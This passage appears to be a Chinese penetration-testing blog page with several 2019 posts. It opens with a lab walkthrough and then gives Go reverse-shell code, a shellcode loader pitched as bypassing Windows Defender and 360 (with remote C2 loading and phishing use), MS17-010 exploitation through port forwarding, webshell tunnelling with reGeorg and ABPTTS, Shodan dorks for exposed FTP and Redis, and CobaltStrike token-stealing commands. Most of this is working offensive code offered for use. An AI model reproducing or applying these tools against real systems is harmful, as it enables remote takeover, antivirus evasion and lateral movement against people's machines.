程序逻辑也比较简单，运行后接受一个输入密码，如果和```passw```相同，则输出证书，否则退出，这儿直接把程序逻辑改一下，去掉判断，输出key和密钥  

![upload successful](/images/pasted-89.png)  
key即是这一关的token  
##### Terminal-1
既然拿到了一个ssh密钥对，那应该还是找ssh登录利用，从资产表可以看到，目前为止还剩172.16.40.0/24这个子网，直接扫22端口  

![upload successful](/images/pasted-90.png)  
果然有一个，用拿到的密钥登录  

![upload successful](/images/pasted-91.png)  
在/opt目录下发现token文件  
##### FPM
发现172.16.40.3这个IP对应admin.test.lab，只能通过172.16.40.2访问，这儿用ssh开本地socks代理来扫描172.16.40.3（网络不稳定，且速度慢），也可以直接传一个扫描工具上去扫，但需要注意一点，实验环境会隔一段时间重置，如果还没扫描完重置环境就GG，只能重来。  
探测到两个端口  </code></pre><p>INFO[0000] tcp://172.16.40.3:9000 is alive and reachable<br>INFO[0000] tcp://172.16.40.3:80 is alive and reachable  </p>
<p>```  </p>
<p>80端口跑nginx，再加上9000端口，很容易想到fpm上来（如果关注之前漏洞发布的话应该知道这个洞，正好我复现过hhh）</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-11-26T13:50:38.000Z" title="2019-11-26T13:50:38.000Z">2019-11-26</time><span class="level-item"> x51 </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/11/26/Golang-study-bypass-wd/">Golang Socket &amp; ShellcodeLoader</a></h1><div class="content"><p><img src="/images/pasted-51.png" alt="upload successful"> </p>
<h4 id="Windows-Reverse-Shell"><a href="#Windows-Reverse-Shell" class="headerlink" title="Windows Reverse Shell"></a>Windows Reverse Shell</h4><p>1、<code>net.Dial</code>回连：  </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">backip := flag.<span class="built_in">String</span>(<span class="string">"d"</span>, <span class="string">"127.0.0.1"</span>, <span class="string">"ServerIpAdddress"</span>)</span><br><span class="line">backport := flag.Int(<span class="string">"p"</span>, 1025, <span class="string">"ServerPort"</span>)</span><br><span class="line">flag.<span class="keyword">Parse</span>()</span><br><span class="line">conn, <span class="keyword">err</span> := <span class="keyword">net</span>.Dial(<span class="string">"tcp"</span>, *backip+<span class="string">":"</span>+strconv.Itoa(*backport))</span><br></pre></td></tr></table></figure>
<p>2、接收远程命令  </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rcmd, _ := bufio.NewReader(conn).ReadString(<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
<p>3、执行</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Command</span><span class="params">(name <span class="keyword">string</span>, arg ...<span class="keyword">string</span>)</span> *<span class="title">Cmd</span></span>  </span><br><span class="line">out, err := exec.Command(strings.TrimSuffix(rcmd, <span class="string">"\n"</span>)).Output()</span><br></pre></td></tr></table></figure>


<h6 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h6><p>这样实现的一个简单的reverse shell，只能“一次性”使用。解决办法有两个：<br>1、添加一个死循环接受远端的命令  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line">	<span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">    <span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">    rcmd, _ := bufio.NewReader(conn).ReadString(<span class="string">'\n'</span>)</span><br><span class="line">    out, err := exec.Command(strings.TrimSuffix(rcmd, <span class="string">"\n"</span>)).Output()</span><br><span class="line">    <span class="built_in">..</span>.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、调cmd.exe</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span><span class="bash"> := exec.Command(<span class="string">"C:\\Windows\\System32\\cmd.exe"</span>)</span></span><br></pre></td></tr></table></figure>
<h4 id="ShellCodeLoader-ByPass-WD-or-360"><a href="#ShellCodeLoader-ByPass-WD-or-360" class="headerlink" title="ShellCodeLoader ByPass WD or 360"></a>ShellCodeLoader ByPass WD or 360</h4><p>加载功能参考：<a href="https://github.com/brimstone/go-shellcode">https://github.com/brimstone/go-shellcode</a><br>code：  </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> procVirtualProtect = syscall.NewLazyDLL(<span class="string">"kernel32.dll"</span>).NewProc(<span class="string">"VirtualProtect"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">VirtualProtect</span><span class="params">(lpAddress unsafe.Pointer, dwSize <span class="keyword">uintptr</span>, flNewProtect <span class="keyword">uint32</span>, lpflOldProtect unsafe.Pointer)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	ret, _, _ := procVirtualProtect.Call(</span><br><span class="line">		<span class="keyword">uintptr</span>(lpAddress),</span><br><span class="line">		<span class="keyword">uintptr</span>(dwSize),</span><br><span class="line">		<span class="keyword">uintptr</span>(flNewProtect),</span><br><span class="line">		<span class="keyword">uintptr</span>(lpflOldProtect))</span><br><span class="line">	<span class="keyword">return</span> ret &gt; <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Run</span><span class="params">(sc []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	<span class="comment">// TODO need a Go safe fork</span></span><br><span class="line">	<span class="comment">// Make a function ptr</span></span><br><span class="line">	f := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Change permissions on f function ptr</span></span><br><span class="line">	<span class="keyword">var</span> oldfperms <span class="keyword">uint32</span></span><br><span class="line">	<span class="keyword">if</span> !VirtualProtect(unsafe.Pointer(*(**<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;f))), unsafe.Sizeof(<span class="keyword">uintptr</span>(<span class="number">0</span>)), <span class="keyword">uint32</span>(<span class="number">0x40</span>), unsafe.Pointer(&amp;oldfperms)) &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">"Call to VirtualProtect failed!"</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Override function ptr</span></span><br><span class="line">	**(**<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;f)) = *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;sc))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Change permissions on shellcode string data</span></span><br><span class="line">	<span class="keyword">var</span> oldshellcodeperms <span class="keyword">uint32</span></span><br><span class="line">	<span class="keyword">if</span> !VirtualProtect(unsafe.Pointer(*(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;sc))), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(sc)), <span class="keyword">uint32</span>(<span class="number">0x40</span>), unsafe.Pointer(&amp;oldshellcodeperms)) &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">"Call to VirtualProtect failed!"</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Call the function ptr it</span></span><br><span class="line">	f()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试了三种方法：<br>1、命令行传递shellcode，shellcode可用msf生成，或cobalstrike的payload（选c），适用反弹shell（rce or webshell）<br>2、将shellcode硬编码到程序中，会弹框，编译添加参数<code>-ldflags=&quot;-H windowsgui&quot;</code>，适用钓鱼，shellcode需处理。<br>3、远程加载（命令行）：<br><code>main1.exe http://0.0.0.0/jquery.js</code>，可在程序硬编码远程C2地址，效果如下：  </p>
<p><img src="/images/pasted-52.png" alt="upload successful"><br>（缺点是添加了网络包net/http后程序体积很大） </p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> D:\Tools\upx<span class="number">-3.95</span>-win64 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">11</span>/<span class="number">27</span>/<span class="number">2019</span>  <span class="number">03</span>:<span class="number">58</span> PM           <span class="number">531</span>,<span class="number">456</span> main.exe</span><br><span class="line">               <span class="number">1</span> 个文件        <span class="number">531</span>,<span class="number">456</span> 字节</span><br><span class="line">               <span class="number">0</span> 个目录 <span class="number">260</span>,<span class="number">310</span>,<span class="number">085</span>,<span class="number">632</span> 可用字节</span><br></pre></td></tr></table></figure>

<p>从测试来看方式2效率最高，也容易扩展，大小可接受，但方法3不落地。</p>
<h4 id="如何精简binary体积？"><a href="#如何精简binary体积？" class="headerlink" title="如何精简binary体积？"></a>如何精简binary体积？</h4><p>1、精简代码<br>往往一件看似美好的事物背后总是带着点缺陷，Golang的静态编译特性运行静态无依赖，但身材却略显“臃肿”，代码分析插件：<code>goweight</code>（GitHub）可以帮助我们进行分析程序体积分布比例。适度减少程序依赖项，让代码更加精小，比如在完全可以去掉任何打印功能的情况下，就可以省出一个<code>fmt</code>大小。</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">D:\CodeSrc\go\src\demo\sc\main&gt;goweight</span><br><span class="line">  <span class="number">3.5</span> MB runtime</span><br><span class="line">  <span class="number">1.4</span> MB <span class="built_in">ref</span>lect</span><br><span class="line">  <span class="number">828</span> kB syscall</span><br><span class="line">  <span class="number">513</span> kB time</span><br><span class="line">  <span class="number">450</span> kB fmt</span><br><span class="line">  <span class="number">445</span> kB os</span><br><span class="line">  <span class="number">428</span> kB <span class="built_in">int</span>ernal/<span class="built_in">ref</span>lectlite</span><br><span class="line">  <span class="number">285</span> kB strconv</span><br><span class="line">  <span class="number">281</span> kB <span class="built_in">string</span>s</span><br><span class="line">  <span class="number">276</span> kB <span class="built_in">int</span>ernal/poll</span><br><span class="line">  <span class="number">230</span> kB unicode</span><br><span class="line">  <span class="number">218</span> kB math</span><br><span class="line">  <span class="number">166</span> kB sync</span><br><span class="line">  <span class="number">160</span> kB <span class="built_in">int</span>ernal/syscall/windows</span><br><span class="line">  <span class="number">145</span> kB <span class="built_in">int</span>ernal/syscall/windows/registry</span><br><span class="line">  <span class="number">143</span> kB io</span><br><span class="line">  <span class="number">118</span> kB sort</span><br><span class="line">   <span class="number">50</span> kB <span class="built_in">int</span>ernal/fmtsort</span><br><span class="line">   <span class="number">50</span> kB encoding/hex</span><br><span class="line">   <span class="number">43</span> kB <span class="built_in">int</span>ernal/cpu</span><br><span class="line">   <span class="number">40</span> kB math/bits</span><br><span class="line">   <span class="number">27</span> kB unicode/utf8</span><br><span class="line">   <span class="number">27</span> kB errors</span><br><span class="line">   <span class="number">20</span> kB sync/atomic</span><br><span class="line">   <span class="number">16</span> kB <span class="built_in">int</span>ernal/bytealg</span><br><span class="line">   <span class="number">15</span> kB runtime/<span class="built_in">int</span>ernal/atomic</span><br><span class="line">   <span class="number">15</span> kB <span class="built_in">int</span>ernal/testlog</span><br><span class="line">   <span class="number">12</span> kB runtime/<span class="built_in">int</span>ernal/sys</span><br><span class="line">  <span class="number">9.0</span> kB demo/sc/shellcode</span><br><span class="line">  <span class="number">8.5</span> kB unicode/utf16</span><br><span class="line">  <span class="number">5.2</span> kB <span class="built_in">int</span>ernal/syscall/windows/sysdll</span><br><span class="line">  <span class="number">4.2</span> kB <span class="built_in">int</span>ernal/race</span><br><span class="line">  <span class="number">2.6</span> kB <span class="built_in">int</span>ernal/oserror</span><br><span class="line">  <span class="number">1.7</span> kB runtime/<span class="built_in">int</span>ernal/math</span><br></pre></td></tr></table></figure>
<p>btw，写了一个通过http加载远程shellcode的功能，结果发现打包后体积太大，goweight分析结果：  </p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:<span class="symbol">\C</span>odeSrc<span class="symbol">\g</span>o<span class="symbol">\s</span>rc<span class="symbol">\d</span>emo<span class="symbol">\s</span>c<span class="symbol">\m</span>ain&gt;goweight</span><br><span class="line">  3.9 MB net/http</span><br><span class="line">  3.5 MB runtime</span><br><span class="line">  1.7 MB crypto/tls</span><br><span class="line">  1.4 MB net</span><br></pre></td></tr></table></figure>
<p>从结果可以看到http的占用率太高，那么这个功能不要也罢。<br>2、<code>ldflags</code>参数去掉符号信息、调试信息<br>先看看直接编译的结果：  </p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x51 D:<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\m</span>ain ❯❯❯ go build main.go</span><br><span class="line">x51 D:<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\m</span>ain ❯❯❯ ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: D:<span class="symbol">\C</span>odeSrc<span class="symbol">\g</span>o<span class="symbol">\s</span>rc<span class="symbol">\d</span>emo<span class="symbol">\s</span>c<span class="symbol">\m</span>ain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----       11/28/2019   7:09 PM        2141184 main.exe</span><br><span class="line">-a----       11/28/2019   7:08 PM           1929 main.go</span><br></pre></td></tr></table></figure>
<p>再来看添加<code>-ldflags</code>参数后的结果：  </p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x51 D:\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\main ❯❯❯ go build -ldflags=<span class="string">"-s -w"</span> main.go</span><br><span class="line">x51 D:\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\main ❯❯❯ <span class="keyword">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: D:\CodeSrc\go\src\demo\sc\main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="params">----</span>                <span class="params">-------------</span>         <span class="params">------</span> <span class="params">----</span></span><br><span class="line">-a<span class="params">----</span>       11/28/2019   7<span class="function">:09</span> PM        1549312 main.exe</span><br><span class="line">-a<span class="params">----</span>       11/28/2019   7<span class="function">:08</span> PM           1929 main.go</span><br></pre></td></tr></table></figure>
<p>很明显带参数编译的体积要更小。<br>3、upx  </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">D</span>:\Tools\upx-3.95-win64&gt;upx.exe</span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          <span class="keyword">Copyright</span> (C) 1996 - 2018</span><br><span class="line">UPX 3.95w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">Usage: upx [-123456789dlthVL] [-qvfk] [-o <span class="keyword">file</span>] <span class="keyword">file</span>..</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  -1     <span class="keyword">compress</span> faster                   -9    <span class="keyword">compress</span> better</span><br><span class="line">  -<span class="keyword">d</span>     decompress                        -<span class="keyword">l</span>    <span class="keyword">list</span> compressed <span class="keyword">file</span></span><br><span class="line">  -t     <span class="keyword">test</span> compressed <span class="keyword">file</span>              -V    <span class="keyword">display</span> <span class="keyword">version</span> number</span><br><span class="line">  -<span class="keyword">h</span>     give <span class="keyword">more</span> <span class="keyword">help</span>                    -<span class="keyword">L</span>    <span class="keyword">display</span> software license</span><br><span class="line">Options:</span><br><span class="line">  -q     be quiet                          -v    be verbose</span><br><span class="line">  -oFILE write output to '<span class="keyword">FILE</span>'</span><br><span class="line">  -f     force compression of suspicious files</span><br><span class="line">  -k     <span class="keyword">keep</span> backup files</span><br><span class="line"><span class="keyword">file</span>..   executables to (<span class="keyword">de</span>)<span class="keyword">compress</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Type</span> 'upx --<span class="keyword">help</span>' <span class="keyword">for</span> <span class="keyword">more</span> detailed <span class="keyword">help</span>.</span><br><span class="line"></span><br><span class="line">UPX comes with ABSOLUTELY <span class="keyword">NO</span> WARRANTY; <span class="keyword">for</span> details visit https:<span class="comment">//upx.github.io</span></span><br></pre></td></tr></table></figure>
<p>upx压缩处理的效果还是非常不错的，我们拿上面去除调试信息的exe直接压缩：  </p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">File</span> <span class="built_in">size</span>         Ratio      <span class="keyword">Format</span>      <span class="keyword">Name</span></span><br><span class="line">--------------------   ------   -----------   -----------</span><br><span class="line"><span class="number">1549312</span> -&gt;    <span class="number">538624</span>   <span class="number">34.77</span>%    win64/pe     main.exe                                                                                                       Packed <span class="number">1</span> <span class="keyword">file</span>.</span><br></pre></td></tr></table></figure>
<p>从1.5M多压缩到500多k，nice，注意到upx有个参数“-9”，可以理解为最大程度压缩吧，对比看一下：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">D:\Tools\upx<span class="number">-3.95</span>-win64&gt;upx main.exe</span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) <span class="number">1996</span> - <span class="number">2018</span></span><br><span class="line">UPX <span class="number">3.95</span>w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug <span class="number">26</span>th <span class="number">2018</span></span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">   <span class="number">1549312</span> -&gt;    <span class="number">538624</span>   <span class="number">34.77</span>%    win64/pe     main.exe                                                                                                       Packed <span class="number">1</span> file.</span><br><span class="line"></span><br><span class="line">D:\Tools\upx<span class="number">-3.95</span>-win64&gt;upx <span class="number">-9</span> main.exe</span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) <span class="number">1996</span> - <span class="number">2018</span></span><br><span class="line">UPX <span class="number">3.95</span>w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug <span class="number">26</span>th <span class="number">2018</span></span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">   <span class="number">1549312</span> -&gt;    <span class="number">531456</span>   <span class="number">34.30</span>%    win64/pe     main.exe                                                                                                       Packed <span class="number">1</span> file.</span><br></pre></td></tr></table></figure>
<p>比不带参数可以小10k左右。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-09-29T06:56:00.000Z" title="2019-09-29T06:56:00.000Z">2019-09-29</time><span class="level-item"> x51 </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/09/29/MSF+%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91MS17-010/">MSF+端口转发攻击内网MS17-010</a></h1><div class="content"><p>本文讨论在一种特定环境下MS17-010的利用方式。  </p>
<h6 id="前置假设"><a href="#前置假设" class="headerlink" title="前置假设"></a>前置假设</h6><p><img src="/images/pasted-47.png" alt="upload successful"><br>A是攻击者MSF所在公网机器；<br>B是内网一台服务器，与A互通；<br>C是内网另一台服务器，与B互通，不通A，存在MS17-010漏洞；  </p>
<h6 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>MS17-010的Payload（dll文件）需要反向连接攻击者IP，但C只能与B通信，Payload执行后是无法在MSF平台接到ReverseShell的，此时需要流量转发（端口转发）。<br>1、生成目标机器后门，反连Server设置成B的IP，端口4455；<br>2、B上开启端口转发，将本地4455的流量转发到A的4466端口，运行EXP；<br>3、A上开启MSF监听本机4466端口；<br>4、A上成功得到来自B机器任意端口的Meterpreter Session；  </p>
<p><img src="/images/pasted-48.png" alt="upload successful">  </p>
<p><img src="/images/pasted-49.png" alt="upload successful">  </p>
<p><img src="/images/pasted-50.png" alt="upload successful">  </p>
<h6 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h6><p>基本都是常规操作，但内网渗透中MS17010这样的场景遇到挺多，做个记录。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-07-31T07:38:47.000Z" title="2019-07-31T07:38:47.000Z">2019-07-31</time><span class="level-item"> X51 </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/07/31/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84socks%E4%BB%A3%E7%90%86/">渗透测试中的Socks代理</a></h1><div class="content"><p>比较常见的一种情况，处于内网的机器，只映射一个Web服务到公网，通过Webshell看到的环境其实是在内网，这类目标一般不通外网，Beacon也不会回连，此时需要代理到目标内网环境。  </p>
<p><img src="/images/pasted-92.png" alt="upload successful">  </p>
<p>个人常用的工具有两个。</p>
<h6 id="Regeorg"><a href="#Regeorg" class="headerlink" title="Regeorg"></a>Regeorg</h6><p><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br>环境：Python2.7<br>首先需要把目标对应的web脚本上传到服务器，jsp的站传tunnel.jsp，php传tunnel.php，然后在浏览器访问tunnel脚本看能否正常解析  </p>
<p><img src="/images/pasted-41.png" alt="upload successful">  </p>
<p>如果出现如上字符串说明可以成功解析，接下来在本地开启代理连接：</p>
<p><img src="/images/pasted-43.png" alt="upload successful"><br>如上所示，代理在10086端口开启成功。<br>BTW：遇到WAF检测流量的情况使用Neo-Regeorg。</p>
<h6 id="abptts"><a href="#abptts" class="headerlink" title="abptts"></a>abptts</h6><p><a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a><br>服务端同样上传jsp/aspx代理脚本，访问确认正常解析，返回一个字符串代表成功解析，将端口转发到本地，可以直接使用，以下命令将该内网主机的3389转发到攻击机的33899端口。 </p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> abpttsclient.py -c webshell/config.txt -u http://xxxxxx.com/abptts.jsp -f <span class="number">127.0.0.1:33899</span>/<span class="number">127.0.0.1:3389</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/pasted-45.png" alt="upload successful">  </p>
<p>注：使用之前生成config文件：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python abpttsfactory.py -c <span class="built_in">config</span>.txt -o /<span class="built_in">config</span>/</span><br></pre></td></tr></table></figure>
<p>如果目标主机是linux，可以先用abptts代理出目标的22端口，然后本地ssh客户端开启隧道进内网，实战中体验较好。(需拿到ssh密码或者开启了公钥登陆)</p>
<p><img src="/images/pasted-46.png" alt="upload successful">  </p>
<h6 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h6><p>待补充。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-05-30T04:35:00.000Z" title="2019-05-30T04:35:00.000Z">2019-05-30</time><span class="level-item"> X51 </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/05/30/shodan-search-tips/">ShodanSearch Tips</a></h1><div class="content"><p>在Shodan搜索时如何快速获取暴漏的未授权访问服务<br>首先熟悉各类服务在登陆成功时会返回的banner信息，比如ftp匿名登陆成功：<br><img src="/images/pasted-37.png" alt="upload successful">  </p>
<p>那么以关键字”230 Login successful”在shodan搜索：  </p>
<p><img src="/images/pasted-38.png" alt="upload successful"></p>
<p>共计197917条ftp未授权（匿名登陆）主机。<br>举一反一<br>观察redis未授权登陆后banner信息：</p>
<p><img src="/images/pasted-39.png" alt="upload successful"><br>搜索关键字<code>redis_version:</code></p>
<p><img src="/images/pasted-40.png" alt="upload successful"><br>其他服务发现方式同理，大概总结流程：<br>1、分析未授权服务特征（banner信息）<br>2、选取keywords（如ftp的230 Login successful）<br>3、shodan获取结果</p>
<h6 id="shodan可挖掘信息远不止此，此处算抛砖引玉"><a href="#shodan可挖掘信息远不止此，此处算抛砖引玉" class="headerlink" title="shodan可挖掘信息远不止此，此处算抛砖引玉"></a>shodan可挖掘信息远不止此，此处算抛砖引玉</h6><p>数据库、工控设备，etc</p>
<p>附：未授权服务利用可参考<code>https://xz.aliyun.com/t/2320</code>这篇文章。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-05-14T07:07:19.000Z" title="2019-05-14T07:07:19.000Z">2019-05-14</time><span class="level-item"> X51 </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/05/14/CobaltStrike-Notes/">Cobaltstrike-Pth(pass the Hash)</a></h1><div class="content"><p>寻找运行在域账号权限下的进程(有可能遇到Domain Admin)</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="bash"> tasklist /v</span></span><br></pre></td></tr></table></figure>
<p>模拟令牌</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">steal_token pid</span></span><br></pre></td></tr></table></figure>
<p>尝试利用</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>\c$</span><br></pre></td></tr></table></figure>
<p>或者在得到域管明文密码的情况下，可以制作令牌来进行传递操作：</p>
